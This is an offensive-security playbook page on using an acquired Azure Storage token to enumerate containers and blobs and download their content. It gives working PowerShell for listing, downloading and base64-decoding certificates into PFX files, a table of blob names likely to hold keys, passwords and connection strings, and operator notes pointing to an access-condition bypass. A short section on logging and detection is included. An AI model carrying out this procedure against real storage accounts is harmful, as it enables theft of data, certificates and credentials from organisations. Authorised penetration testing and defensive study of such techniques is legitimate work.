## Overview

Azure Storage data plane access uses a separate token audience from ARM. A token scoped to `https://storage.azure.com` is what the Storage REST API validates — an ARM token alone cannot list or download blobs. Once the correct data plane token is in hand, enumeration follows the Storage REST API directly, without going through the management plane at all.

The data plane exposes container and blob metadata via XML responses. Content inside blobs — certificates, configuration files, scripts — may be base64-encoded and require decoding before use. ABAC conditions on the RBAC assignment may gate download even when enumeration succeeds.

## Preconditions

| Permission | Action |
|---|---|
| `Microsoft.Storage/storageAccounts/blobServices/containers/read` | Enumerate containers |
| `Microsoft.Storage/storageAccounts/blobServices/containers/blobs/read` | List and download blobs |
| Storage data plane token | Scope: `https://storage.azure.com/.default` |

The two permission tiers matter: `actions` (control plane) cover container metadata; `dataActions` (data plane) cover blob content. An identity may have one without the other.

## Attack Chain

```
Acquire Storage AT        →  scope: https://storage.azure.com/.default
                          ↓
GET /?comp=list           →  enumerate containers in the storage account
                          ↓
GET /<container>?restype=container&comp=list
                          →  list blob names and metadata in target container
                          ↓
Inspect blob names        →  identify certificates, scripts, config files
                          ↓
GET /<container>/<blob>   →  download blob content
                          ↓
Decode if base64          →  reconstruct PFX, parse JSON config, extract credentials
```

## Container Enumeration

```powershell
$storageAccount = "<STORAGE_ACCOUNT>"
$headers = @{
    "Authorization"   = "Bearer $StorageToken"
    "x-ms-version"    = "2020-04-08"
    "accept-encoding" = "gzip, deflate"
}

# List all containers
$response = Invoke-WebRequest -Method GET `
    -Uri "https://$storageAccount.blob.core.windows.net/?comp=list" `
    -Headers $headers -UseBasicParsing

[xml]$xml = $response.Content.TrimStart([char]0xFEFF)
$xml.EnumerationResults.Containers.Container | Select-Object Name,
    @{n="Modified"; e={$_.Properties.'Last-Modified'}},
    @{n="Lease";    e={$_.Properties.LeaseStatus}} | Format-Table
```

## Blob Enumeration

```powershell
$container = "<CONTAINER_NAME>"
$blobList  = Invoke-WebRequest -Method GET `
    -Uri "https://$storageAccount.blob.core.windows.net/$container`?restype=container&comp=list" `
    -Headers $headers -UseBasicParsing

[xml]$blobXml = $blobList.Content.TrimStart([char]0xFEFF)
$blobXml.EnumerationResults.Blobs.Blob | Select-Object Name,
    @{n="Size";     e={$_.Properties.'Content-Length'}},
    @{n="Modified"; e={$_.Properties.'Last-Modified'}},
    @{n="Type";     e={$_.Properties.'Content-Type'}} | Format-Table
```

## Blob Download and Decode

```powershell
$blobName = "<TARGET_BLOB>"
Invoke-RestMethod -Method GET `
    -Uri "https://$storageAccount.blob.core.windows.net/$container/$blobName" `
    -Headers $headers -OutFile ".\$blobName" -UseBasicParsing

# If content is base64-encoded (common for certificates stored as text)
$raw       = Get-Content ".\$blobName" -Raw
$bytes     = [Convert]::FromBase64String($raw.Trim())
[System.IO.File]::WriteAllBytes("C:\path\to\output.pfx", $bytes)
Get-PfxCertificate -FilePath "C:\path\to\output.pfx"
```

## What to Look For in Blobs

| Blob name pattern | Likely content |
|---|---|
| `*.pfx`, `*.p12`, `*.cer` | Certificate with private key |
| `*.pfx.b64`, `*.txt` (base64 length) | Encoded certificate |
| `*.json`, `*.config`, `appsettings.*` | Connection strings, API keys |
| `*.ps1`, `*.py`, `*.sh` | Scripts with embedded credentials |
| `*password*`, `*secret*`, `*cred*` | Self-descriptive |

## Operator Notes

- If the `blobs/read` dataAction is present but blob download fails, an ABAC condition may be gating access — check the role assignment conditions before concluding access is denied. See **ABAC Condition Bypass** for the next step.
- `x-ms-version` must be present in the request header or the Storage API returns a 400. Use `2020-04-08` or later for ABAC-aware operations.
- If `NextMarker` in the container or blob list response is non-empty, paginate with `&marker=<value>` to retrieve all results.
- The `@microsoft.graph.downloadUrl` shortcut from Graph OneDrive responses is not available for Storage data plane — construct URLs manually using account/container/blob names.

## Detection / Friction Points

- Storage diagnostic logs record `ListContainers`, `ListBlobs`, and `GetBlob` operations — actor (identity or SAS), timestamp, container, and blob name are logged.
- Logs must be explicitly enabled on the storage account (`Diagnostic settings → StorageRead`). Many accounts have logging disabled.
- Bulk blob reads across many containers in a short window generate high-volume log events — anomaly detection tools may flag unusual read patterns.
